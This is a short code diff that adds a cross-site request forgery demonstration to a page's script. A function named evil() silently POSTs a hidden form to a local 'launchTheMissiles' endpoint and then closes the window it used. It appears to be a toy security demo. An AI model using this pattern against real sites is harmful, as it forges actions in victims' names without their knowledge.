@@ -4,6 +4,14 @@
 <script type="text/javascript">
   function evil() {
     // Can we launch missiles?
+    var formElement = $('<form></form>')[0];
+    formElement.action = 'http://localhost:8080/service/launchTheMissiles/';
+    formElement.method = 'POST';
+    formElement.target = 'evil_window';
+    formElement.submit();
+    setTimeout(function() {
+        window.open("", "evil_window").close();
+    }, 5);
   }
 </script>
 
